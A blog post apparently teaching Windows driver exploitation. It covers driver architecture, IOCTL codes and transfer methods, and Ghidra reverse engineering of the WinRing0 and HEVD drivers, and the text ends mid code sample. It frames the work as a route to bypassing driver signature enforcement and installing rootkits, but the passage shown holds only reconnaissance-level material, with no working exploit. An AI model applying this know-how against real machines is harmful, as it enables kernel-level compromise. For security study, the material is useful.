# https://bsssq.xyz/posts/vulnerable-drivers/

<!DOCTYPE html><html lang="en-us"><body><div id="single-header"><h1>exploiting driver-based vulnerabilities</h1><div id="single-meta"><span class="datesub">wednesday, november 6, 2024</span></div></div><div class="content-container"><main><h2 id="tldr">tl;dr</h2><p>drivers are software components that facilitate communicatioon between the OS and hardware devices. since they operate at the kernel level, they’re granted extensive privileges and direct access to system resources. as a result, <a href="https://www.packetlabs.net/posts/what-are-bring-your-own-vulnerable-driver-attacks/" target="_blank" rel="noreferrer nofollow">exploiting vulnerabilities in drivers</a>
is highly valuable. by manipulating MSRs (like <code>IA32_LSTAR</code>), abusing IOCTL, writing operations in kernel memory, it’s possible to bypass security measures like DSE (Driver Signature Enforcement) and install rootkits, with elevated kernel-level privileges.</p><h2 id="driver-architecture">driver architecture</h2><p>per the <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff554678%28v=vs.85%29.aspx" target="_blank" rel="noreferrer nofollow">MSDN</a>
, “a driver is a software component that lets the operating system and a device communicate with each other”.</p><p>this means the kernel interacts with a device via drivers, that do things like detecting attached devices, communicating with them, and exposing them to applications by means of an interface. in essence, drivers have two interfaces: one that communicates with the OS and the other that communicates with the device hardware.</p><h3 id="overview-of-windows-architecture">overview of Windows’ architecture</h3><p>peep my crudely drawn diagram of the core Windows architecture.</p><p></p><p class="imgp"><img loading="lazy" src="https://bsssq.xyz/arch-overview.png" alt="architecture overview"></p><p></p><p>there are two main components: <a href="https://msdn.microsoft.com/en-in/library/windows/hardware/ff554836%28v=vs.85%29.aspx" target="_blank" rel="noreferrer nofollow">user mode and kernel mode</a>
.</p><p>the kernel subsystem makes up the low-level kernel mode portion and is inside the <code>NTOSKRNL.exe</code>. it handles much of the core functionalities, like I/O, object management, power management, security, and process management.</p><p>all I/O requests are packet-driven, which utilize I/O Request Packets (IRP) and asynchronous I/O. these are passed between the system and the driver, and from one driver to another.</p><h3 id="driver-stack">driver stack</h3><p>drivers are typically organized in a layered architecture (aka driver stack):</p><ul><li><p><strong>bus drivers</strong>: at the bottom of the stack. they manage the specific bus (PCI, USB, etc.) where the device is attached, and their communication with the OS.</p></li><li><p><strong>function drivers</strong>: these are device-specific drivers that implement the core functionality for a particular device.</p></li><li><p><strong>filter drivers</strong>: optional drivers that can be inserted above or below function drivers to add functionality or modify their behaviour.</p></li><li><p><strong>class drivers</strong>: high-level, generic drivers that handle a class of devices (storage, display, network, etc.)</p></li></ul><p></p><p class="imgp"><img loading="lazy" src="https://bsssq.xyz/driverstack-.png" alt="driver stack"></p><p></p><h3 id="device-objects--driver-stack">device objects + driver stack</h3><p>when the system starts up, the PnP (Plug-N-Play) manager starts at the lowest-level bus and loads the bus driver. the bus driver identifies the devices on its bus and creates <strong>device objects</strong> for them. then, the device object stack gets created.</p><p>each driver has an associated device object to represent its participation in the processing of I/O requests for itself. these device objects are arranged in a <strong>stack</strong>.</p><p></p><p class="imgp"><img loading="lazy" src="https://bsssq.xyz/detailstack-.png" alt="detailed stack"></p><p></p><p>in the above diagram, there are two devices, each with its own device stack. they’re serviced by a single driver set.</p><h3 id="design-components">design components</h3><h4 id="entry-points"><strong>entry points</strong></h4><p>drivers have several key entry points:</p><ul><li><p><code>DriverEntry</code>: this is the main entry point, and it’s called when the driver is loaded.</p></li><li><p><code>AddDevice</code>: this is called when a new device is detected.</p></li><li><p><code>DispatchRoutines</code>: handles I/O requests from user-mode apps.</p></li><li><p><code>Unload</code> aka <code>DriverUnload</code>: called when the driver is unloaded from memory.</p></li></ul><p><code>DriverEntry</code> is basically <code>main()</code> for drivers, and it sets up the driver/device object (in order to receive IRPs), symlinks (to allow user mode apps to set IRPs), and major function handlers (to define which internal functions to call: <code>IRP_MJ_CREATE</code>, <code>IR_MJ_DEVICE_CONTROL</code>, <code>IRP_MJ_READ</code>, <code>IRP_MJ_WRITE</code>, <code>IRP_MJ_CLOSE</code>).</p><h4 id="irp-handler"><strong>IRP handler</strong></h4><p>recall that Windows uses IRPs to communicate between the user-mode and kernel-mode. IRPs are data structures that encapsulate I/O requests, and drivers process them before passing them up/down the driver stack.</p><p>requests are passed down a stack until the target driver is ready to accept + process it. most drivers use a “switch case” to decide what to do based on the included IOCTL (I/O Control Codes). a switch case basically allows the driver to perform different operations based on the command received from user space.</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:flex"><span><span style="color:#8b949e;font-style:italic">// basic example of a switch case
</span></span></span><span style="display:flex"><span><span style="color:#8b949e;font-style:italic"></span>
</span></span><span style="display:flex"><span><span style="color:#ff7b72">switch</span> (IoControlCode) {
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">case</span> <span style="color:#79c0ff;font-weight:700">IOCTL_COMMAND_1</span>:
</span></span><span style="display:flex"><span>        <span style="color:#8b949e;font-style:italic">// Handle command 1
</span></span></span><span style="display:flex"><span><span style="color:#8b949e;font-style:italic"></span>        <span style="color:#ff7b72">break</span>;
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">case</span> <span style="color:#79c0ff;font-weight:700">IOCTL_COMMAND_2</span>:
</span></span><span style="display:flex"><span>        <span style="color:#8b949e;font-style:italic">// Handle command 2
</span></span></span><span style="display:flex"><span><span style="color:#8b949e;font-style:italic"></span>        <span style="color:#ff7b72">break</span>;
</span></span><span style="display:flex"><span>    <span style="color:#8b949e;font-style:italic">// ... more cases ...
</span></span></span><span style="display:flex"><span><span style="color:#8b949e;font-style:italic"></span>    <span style="color:#ff7b72">default</span><span style="color:#ff7b72;font-weight:700">:</span>
</span></span><span style="display:flex"><span>        <span style="color:#8b949e;font-style:italic">// Handle unknown commands
</span></span></span><span style="display:flex"><span><span style="color:#8b949e;font-style:italic"></span>        status <span style="color:#ff7b72;font-weight:700">=</span> STATUS_INVALID_DEVICE_REQUEST;
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72">break</span>;
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>the IRP is a <a href="https://gist.github.com/matterpreter/57e317152795a48e50475f2a1bb6c850" target="_blank" rel="noreferrer nofollow">very complex kernel structure</a>
that includes pretty much everything the driver needs to know about the request, like buffer information, major functions, and more.</p><h4 id="ioctls"><strong>IOCTLs</strong></h4><p>these are part of the IRP, passed with the <code>IRP_MJ_DEVICE_CONTROL</code> request. all requests from user-mode that call <code>DeviceIoControl()</code> generate this request, and it’s located <code>Tail.Overlay.CurrentStackLocation.MajorFunction.Parameters.DeviceIoControl.IoControlCode</code> (yes, seriously).</p><p>IOCTLs have four attributes: <strong>device type</strong>, <strong>function code</strong>, <strong>transfer type</strong>, and <strong>required access</strong>.</p><ol><li><strong>the device type</strong>:</li></ol><ul><li><p>identifies the device type (!)</p></li><li><p>must match the <code>DeviceType</code> in the driver’s <code>Device_Object</code> structure.</p></li><li><p>values &lt; 0x8000 are reserved for Microsoft, but values &gt;= 0x8000 can be used by vendors (via setting the <code>Common</code> bit).</p></li></ul><ol start="2"><li><strong>the function code</strong>:</li></ol><ul><li><p>identifies the specific function to be performed (by the driver).</p></li><li><p>values &lt; 0x800 reserved for Microsoft, but values &gt;= 0x800 can be used by vendors (via setting the <code>Custom</code> bit).</p></li></ul><ol start="3"><li><strong>the transfer type (method)</strong>:</li></ol><ul><li><p>this indicates how data is passed down between the caller and driver.</p></li><li><p>the options include: <code>METHOD_BUFFERED</code>, <code>METHOD_IN_DIRECT</code>, <code>METHOD_OUT_DIRECT</code>, <code>METHOD_NEITHER</code>.</p></li></ul><p><code>METHOD_NEITHER</code>: the I/O Manager does no checks on the buffers or their lengths.</p><p><code>METHOD_IN_DIRECT</code>: the input buffer is allocated as <code>METHOD_BUFFERED</code>.</p><p><code>METHOD_OUT_DIRECT</code>: the output buffer is probed to make sure it’s readable/writable in the current access mode. it then locks the memory pages.</p><p><code>METHOD_BUFFERED</code>: the input and output buffers, and their lengths, are copied to the kernel.</p><p>if you see <code>METHOD_NEITHER</code>, the driver is probably vulnerable. buffers have to be probed properly to avoid or limit this!</p><ol start="4"><li><strong>the required access</strong>:</li></ol><ul><li><p>specifies the access rights that the caller must have.</p></li><li><p>common values:</p></li><li><p><code>FILE_READ_DATA</code>: caller needs read access.</p></li><li><p><code>FILE_WRITE_DATA</code>: caller needs write access.</p></li><li><p><code>FILE_READ_DATA | FILE_WRITE_DATA</code>: caller needs both.</p></li><li><p><code>FILE_ANY_ACCESS</code>: allows IOCTL regardless of granted access (used for some system-defined IOCTLs).</p></li></ul><p>combining these attributes, we get the <code>CTL_CODE</code> macro that’s used to define an IOCTL.</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:flex"><span><span style="color:#8b949e;font-weight:700;font-style:italic">#define IOCTL_Device_Function 
</span></span></span><span style="display:flex"><span><span style="color:#8b949e;font-weight:700;font-style:italic"></span><span style="color:#d2a8ff;font-weight:700">CTL_CODE</span>(DeviceType, Function, Method, Access)
</span></span></code></pre></div><p>an example <code>CTL_CODE</code> could be:</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:flex"><span><span style="color:#d2a8ff;font-weight:700">CTL_CODE</span>(<span style="color:#a5d6ff">0x8000</span>, <span style="color:#a5d6ff">0x800</span>, METHOD_BUFFERED, FILE_ANY_ACCESS)
</span></span></code></pre></div><h2 id="user-mode-interactions">user-mode interactions</h2><p></p><p class="imgp"><img loading="lazy" src="https://bsssq.xyz/umi3.png" alt="user mode interactions"></p><p></p><ol><li><p>the driver is loaded into kernel mode. a <strong>driver object</strong> is created, which connects to a <strong>device object</strong> (<code>0x8000</code>). the driver object then sets up an IRP handler, for device control. four functions are initialized (<code>DrvFunc0</code> -&gt; <code>DrvFunc3</code>). a <strong>symlink</strong> is established to bridge user-mode and kernel-mode.</p></li><li><p>a user-mode client initializes with input + output buffers. the client uses <code>CreateFile()</code> to connect to the symlink. this creates a connection through the device object to the driver object.</p></li><li><p>the client then sends an IRP using <code>DeviceIoControl()</code>. the parameters include the handle, the <code>IOCTL_FUNC2</code>, the input/output buffers and their sizes, plus some null params.</p></li></ol><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:flex"><span><span style="color:#8b949e;font-weight:700;font-style:italic">#define IOCTL_FUNC2 
</span></span></span><span style="display:flex"><span><span style="color:#8b949e;font-weight:700;font-style:italic"></span><span style="color:#d2a8ff;font-weight:700">CTL_CODE</span>(<span style="color:#a5d6ff">0x8000</span>, <span style="color:#a5d6ff">0x802</span>, METHOD_BUFFERED, FILE_ANY_ACCESS)
</span></span></code></pre></div><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:flex"><span><span style="color:#d2a8ff;font-weight:700">DeviceIoControl</span>(
</span></span><span style="display:flex"><span>    Handle,
</span></span><span style="display:flex"><span>    IOCTL_FUNC2,
</span></span><span style="display:flex"><span>    InputBuffer, 
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">sizeof</span>(InputBuffer),
</span></span><span style="display:flex"><span>    OutputBuffer, 
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">sizeof</span>(OutputBuffer),
</span></span><span style="display:flex"><span>    null, 
</span></span><span style="display:flex"><span>    null
</span></span><span style="display:flex"><span>);
</span></span></code></pre></div><ol start="4"><li><p>the IRP is sent through the symlink to the device object. the driver object receives the IRP and the IRP handler processes it with function code <code>0x802</code>. this request is routed to the appropriate <strong>driver function</strong>.</p></li><li><p>the driver processes the request in kernel-mode. the IRP handler calls <code>IoCompleteRequest()</code>, and the results are passed back through the device object. this response travels through the symlink back to the user-mode client, and the client receives the output in its <strong>output buffer</strong>.</p></li></ol><h2 id="reverse-engineering-drivers">reverse engineering drivers</h2><h3 id="finding-driverentry--irp-handler">finding <code>DriverEntry</code> + IRP handler</h3><p>drivers that are compiled with <code>/GS</code> contain a “false” <code>DriverEntry</code>. the second function within the entry function is the “actual” <code>DriverEntry</code>. drivers can also implement custom checks before the IRP handler is set up, and they can choose to load based on its own checks.</p><p>when dealing with decompiled code (for drivers and in general), <a href="https://github.com/0x6d696368/ghidra-data/tree/master/typeinfo" target="_blank" rel="noreferrer nofollow">using custom datatypes</a>
can make them much easier to read. for drivers, datatypes like <code>PDRIVER_OBJECT</code>, <code>PIRP</code>, <code>NTSTATUS</code>, <code>UNICODE_STRING</code> are all heavily used. using the linked datatypes, ghidra can modify code that looks like this:</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:flex"><span>ulonglong <span style="color:#d2a8ff;font-weight:700">entry</span>(ulonglong param_1)
</span></span><span style="display:flex"><span>{
</span></span><span style="display:flex"><span>    uint uVar1;
</span></span><span style="display:flex"><span>    ulonglong uVar2;
</span></span><span style="display:flex"><span>    undefined8 local_res8[<span style="color:#a5d6ff">2</span>];
</span></span><span style="display:flex"><span>    undefined8 uVar3;
</span></span><span style="display:flex"><span>    undefined local_28[<span style="color:#a5d6ff">16</span>];
</span></span><span style="display:flex"><span>    undefined local_18[<span style="color:#a5d6ff">16</span>];
</span></span><span style="display:flex"><span>    
</span></span><span style="display:flex"><span>    uVar1 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0x15073</span>;
</span></span><span style="display:flex"><span>    <span style="color:#d2a8ff;font-weight:700">FUN_00015004</span>();
</span></span><span style="display:flex"><span>    local_res8[<span style="color:#a5d6ff">0</span>] <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0</span>;
</span></span><span style="display:flex"><span>    <span style="color:#d2a8ff;font-weight:700">RtlInitUnicodeString</span>(local_28,<span style="color:#a5d6ff">"</span><span style="color:#79c0ff">\\</span><span style="color:#a5d6ff">Device</span><span style="color:#79c0ff">\\</span><span style="color:#a5d6ff">WinRing0_1_2_0"</span>);
</span></span><span style="display:flex"><span>    uVar1 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#d2a8ff;font-weight:700">IoCreateDevice</span>(param_1,<span style="color:#a5d6ff">0</span>,local_28,<span style="color:#a5d6ff">0x8000</span>,<span style="color:#a5d6ff">0x100</span>,<span style="color:#a5d6ff">0</span>,local_res8,uVar3);
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">if</span> ((<span style="color:#ff7b72">int</span>)uVar2 <span style="color:#ff7b72;font-weight:700">&lt;</span> <span style="color:#a5d6ff">0</span>) {
</span></span><span style="display:flex"><span>        DAT_00013110 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0xffffffff</span>;
</span></span><span style="display:flex"><span>    }
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">else</span> {
</span></span><span style="display:flex"><span>        DAT_00013110 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0</span>;
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72;font-weight:700">*</span>(undefined8 <span style="color:#ff7b72;font-weight:700">*</span>)(param_1 <span style="color:#ff7b72;font-weight:700">+</span> <span style="color:#a5d6ff">0x70</span>) <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0x11068</span>;
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72;font-weight:700">*</span>(undefined8 <span style="color:#ff7b72;font-weight:700">*</span>)(param_1 <span style="color:#ff7b72;font-weight:700">+</span> <span style="color:#a5d6ff">0xa0</span>) <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0x11068</span>;
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72;font-weight:700">*</span>(undefined8 <span style="color:#ff7b72;font-weight:700">*</span>)(param_1 <span style="color:#ff7b72;font-weight:700">+</span> <span style="color:#a5d6ff">0xa8</span>) <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0x11068</span>;
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72;font-weight:700">*</span>(undefined8 <span style="color:#ff7b72;font-weight:700">*</span>)(param_1 <span style="color:#ff7b72;font-weight:700">+</span> <span style="color:#a5d6ff">0xb0</span>) <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0x11469</span>;
</span></span><span style="display:flex"><span>        <span style="color:#d2a8ff;font-weight:700">RtlInitUnicodeString</span>(local_18,<span style="color:#a5d6ff">"</span><span style="color:#79c0ff">\\</span><span style="color:#a5d6ff">DosDevices</span><span style="color:#79c0ff">\\</span><span style="color:#a5d6ff">WinRing0_1_2_0"</span>);
</span></span><span style="display:flex"><span>        uVar1 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#d2a8ff;font-weight:700">IoCreateSymbolicLink</span>(local_18,local_28);
</span></span><span style="display:flex"><span>        uVar2 <span style="color:#ff7b72;font-weight:700">=</span> (ulonglong)uVar1;
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72">if</span> ((<span style="color:#ff7b72">int</span>)uVar1 <span style="color:#ff7b72;font-weight:700">&lt;</span> <span style="color:#a5d6ff">0</span>) {
</span></span><span style="display:flex"><span>            <span style="color:#d2a8ff;font-weight:700">IoDeleteDevice</span>(local_res8[<span style="color:#a5d6ff">0</span>]);
</span></span><span style="display:flex"><span>        }
</span></span><span style="display:flex"><span>    }
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">return</span> uVar2;
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>to this:</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:flex"><span>NTSTATUS <span style="color:#d2a8ff;font-weight:700">DriverEntry</span>(PDRIVER_OBJECT DriverObject)
</span></span><span style="display:flex"><span>{
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">int</span> iVar1;
</span></span><span style="display:flex"><span>    undefined8 local_res8[<span style="color:#a5d6ff">2</span>];
</span></span><span style="display:flex"><span>    undefined8 uVar2;
</span></span><span style="display:flex"><span>    undefined local_28[<span style="color:#a5d6ff">16</span>];
</span></span><span style="display:flex"><span>    undefined local_18[<span style="color:#a5d6ff">16</span>];
</span></span><span style="display:flex"><span>    
</span></span><span style="display:flex"><span>    iVar1 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0x15073</span>;
</span></span><span style="display:flex"><span>    <span style="color:#d2a8ff;font-weight:700">FUN_00015008</span>();
</span></span><span style="display:flex"><span>    local_res8[<span style="color:#a5d6ff">0</span>] <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0</span>;
</span></span><span style="display:flex"><span>    <span style="color:#d2a8ff;font-weight:700">RtlInitUnicodeString</span>(local_28,<span style="color:#a5d6ff">"</span><span style="color:#79c0ff">\\</span><span style="color:#a5d6ff">Device</span><span style="color:#79c0ff">\\</span><span style="color:#a5d6ff">WinRing0_1_2_0"</span>);
</span></span><span style="display:flex"><span>    iVar1 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#d2a8ff;font-weight:700">IoCreateDevice</span>(DriverObject,<span style="color:#a5d6ff">0</span>,local_28,<span style="color:#a5d6ff">0x8000</span>,<span style="color:#a5d6ff">0x100</span>,<span style="color:#a5d6ff">0</span>,local_res8,uVar2);
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">if</span> (iVar1 <span style="color:#ff7b72;font-weight:700">&lt;</span> <span style="color:#a5d6ff">0</span>) {
</span></span><span style="display:flex"><span>        DAT_00013110 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0xffffffff</span>;
</span></span><span style="display:flex"><span>    }
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">else</span> {
</span></span><span style="display:flex"><span>        DAT_00013110 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0</span>;
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72;font-weight:700">*</span>(Code <span style="color:#ff7b72;font-weight:700">**</span>)DriverObject<span style="color:#ff7b72;font-weight:700">-&gt;</span>MajorFunction <span style="color:#ff7b72;font-weight:700">=</span> FUN_00011068;
</span></span><span style="display:flex"><span>        DriverObject<span style="color:#ff7b72;font-weight:700">-&gt;</span>MajorFunction[<span style="color:#a5d6ff">2</span>] <span style="color:#ff7b72;font-weight:700">=</span> (PDRIVER_DISPATCH)<span style="color:#a5d6ff">0x11068</span>;
</span></span><span style="display:flex"><span>        DriverObject<span style="color:#ff7b72;font-weight:700">-&gt;</span>MajorFunction[<span style="color:#a5d6ff">0xa0</span>] <span style="color:#ff7b72;font-weight:700">=</span> (PDRIVER_DISPATCH)<span style="color:#a5d6ff">0x11068</span>;
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72;font-weight:700">*</span>(Code <span style="color:#ff7b72;font-weight:700">**</span>)DriverObject<span style="color:#ff7b72;font-weight:700">-&gt;</span>DriverUnload <span style="color:#ff7b72;font-weight:700">=</span> FUN_00011469;
</span></span><span style="display:flex"><span>        <span style="color:#d2a8ff;font-weight:700">RtlInitUnicodeString</span>(local_18,<span style="color:#a5d6ff">"</span><span style="color:#79c0ff">\\</span><span style="color:#a5d6ff">DosDevices</span><span style="color:#79c0ff">\\</span><span style="color:#a5d6ff">WinRing0_1_2_0"</span>);
</span></span><span style="display:flex"><span>        iVar1 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#d2a8ff;font-weight:700">IoCreateSymbolicLink</span>(local_18,local_28);
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72">if</span> (iVar1 <span style="color:#ff7b72;font-weight:700">&lt;</span> <span style="color:#a5d6ff">0</span>) {
</span></span><span style="display:flex"><span>            <span style="color:#d2a8ff;font-weight:700">IoDeleteDevice</span>(local_res8[<span style="color:#a5d6ff">0</span>]);
</span></span><span style="display:flex"><span>        }
</span></span><span style="display:flex"><span>    }
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">return</span> (NTSTATUS)iVar1;
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>for this to happen, the return value was changed to <code>NTSTATUS</code>, the function was renamed <code>DriverEntry</code>, the parameter was changed to <code>PDRIVER_OBJECT</code>, and <code>param_1</code> was changed to <code>DriverObject</code>.</p><p>here are some common major function codes and their offsets.</p><table><thead><tr><th><strong>major function</strong></th><th><strong>code</strong></th><th><strong>related user-mode function</strong></th></tr></thead><tbody><tr><td><code>IRP_MJ_CREATE</code></td><td><code>0x0</code></td><td><code>CreateFile()</code></td></tr><tr><td><code>IRP_MJ_CLOSE</code></td><td><code>0x2</code></td><td><code>CloseHandle()</code></td></tr><tr><td><code>IRP_MJ_READ</code></td><td><code>0x3</code></td><td><code>ReadFile()</code></td></tr><tr><td><code>IRP_MJ_WRITE</code></td><td><code>0x4</code></td><td><code>WriteFile()</code></td></tr><tr><td><code>IRP_MJ_DEVICE_CONTROL</code></td><td><code>0xE</code></td><td><code>DeviceIoControl()</code></td></tr><tr><td><code>IRP_MJ_SHUTDOWN</code></td><td><code>0x10</code></td><td>shutdown</td></tr></tbody></table><p>the key is to look for a reference to <code>PDRIVER_OBJECT</code> + <code>0xE0</code>.</p><h3 id="checking-for-access-restrictions">checking for access restrictions</h3><p>since Microsoft added <code>IoCreateDeviceSecure()</code>, devs can apply a DACL to the device object. you can validate this with WinObj to see if the SDDL is set properly, and if it’s there that means you’ll need a high IL in order to exploit and send IOCTLs. look for <code>if</code> statements around the switch statement (which handles the IOCTLs).</p><h3 id="reversing-internal-functions">reversing internal functions</h3><p>if you can talk to the driver, the next step is to investigate the functions mapped to the IOCTL. look for debug strings containing information about the function and imported functions.</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:flex"><span>IoControlCode <span style="color:#ff7b72;font-weight:700">=</span> IrpSp<span style="color:#ff7b72;font-weight:700">-&gt;</span>Parameters.DeviceIoControl.IoControlCode;
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#ff7b72">if</span> (IrpSp)
</span></span><span style="display:flex"><span>{
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">switch</span> (IoControlCode)
</span></span><span style="display:flex"><span>    {
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72">case</span> <span style="color:#79c0ff;font-weight:700">HEVD_IOCTL_BUFFER_OVERFLOW_STACK</span>:
</span></span><span style="display:flex"><span>            <span style="color:#d2a8ff;font-weight:700">DbgPrint</span>(<span style="color:#a5d6ff">"****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">"</span>);
</span></span><span style="display:flex"><span>            Status <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#d2a8ff;font-weight:700">BufferOverflowStackIoctlHandler</span>(Irp, IrpSp);
</span></span><span style="display:flex"><span>            <span style="color:#d2a8ff;font-weight:700">DbgPrint</span>(<span style="color:#a5d6ff">"****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">"</span>);
</span></span><span style="display:flex"><span>            <span style="color:#ff7b72">break</span>;
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72">case</span> <span style="color:#79c0ff;font-weight:700">HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS</span>:
</span></span><span style="display:flex"><span>            <span style="color:#d2a8ff;font-weight:700">DbgPrint</span>(<span style="color:#a5d6ff">"****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">"</span>);
</span></span><span style="display:flex"><span>            Status <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#d2a8ff;font-weight:700">BufferOverflowStackGSIoctlHandler</span>(Irp, IrpSp);
</span></span><span style="display:flex"><span>            <span style="color:#d2a8ff;font-weight:700">DbgPrint</span>(<span style="color:#a5d6ff">"****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">"</span>);
</span></span><span style="display:flex"><span>            <span style="color:#ff7b72">break</span>;
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72">case</span> <span style="color:#79c0ff;font-weight:700">HEVD_IOCTL_ARBITRARY_WRITE</span>:
</span></span><span style="display:flex"><span>            <span style="color:#d2a8ff;font-weight:700">DbgPrint</span>(<span style="color:#a5d6ff">"****** HEVD_IOCTL_ARBITRARY_WRITE ******</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">"</span>);
</span></span><span style="display:flex"><span>            Status <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#d2a8ff;font-weight:700">ArbitraryWriteIoctlHandler</span>(Irp, IrpSp);
</span></span><span style="display:flex"><span>            <span style="color:#d2a8ff;font-weight:700">DbgPrint</span>(<span style="color:#a5d6ff">"****** HEVD_IOCTL_ARBITRARY_WRITE ******</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">"</span>);
</span></span><span style="display:flex"><span>            <span style="color:#ff7b72">break</span>;
</span></span><span style="display:flex"><span>    }
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>drivers usually ship with detailed debug strings, that can only be seen through an attached kernel debugger. often, these contain function names, specific error messages (beyond <code>NTSTATUS</code> codes), and detailed descriptions of what a function does.</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:flex"><span><span style="color:#d2a8ff;font-weight:700">_PrintMessage</span>(<span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">"ProcessHelper</span><span style="color:#79c0ff">\\</span><span style="color:#a5d6ff">ProcessHelper.c"</span>, <span style="color:#a5d6ff">0x90</span>, <span style="color:#a5d6ff">"ZmnPhEnumProcesses"</span>, <span style="color:#a5d6ff">0</span>,
</span></span><span style="display:flex"><span>              <span style="color:#a5d6ff">"Process count is %d"</span>);
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:700">*</span>param_1 <span style="color:#ff7b72;font-weight:700">&lt;</span> iVar6 <span style="color:#ff7b72;font-weight:700">+</span> <span style="color:#a5d6ff">1U</span>) {
</span></span><span style="display:flex"><span>    uVar5 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0xc0000023</span>;
</span></span><span style="display:flex"><span>    <span style="color:#d2a8ff;font-weight:700">_PrintMessage</span>(<span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">"ProcessHelper</span><span style="color:#79c0ff">\\</span><span style="color:#a5d6ff">ProcessHelper.c"</span>, <span style="color:#a5d6ff">0x95</span>, <span style="color:#a5d6ff">"ZmnPhEnumProcesses"</span>, <span style="color:#a5d6ff">0</span>,
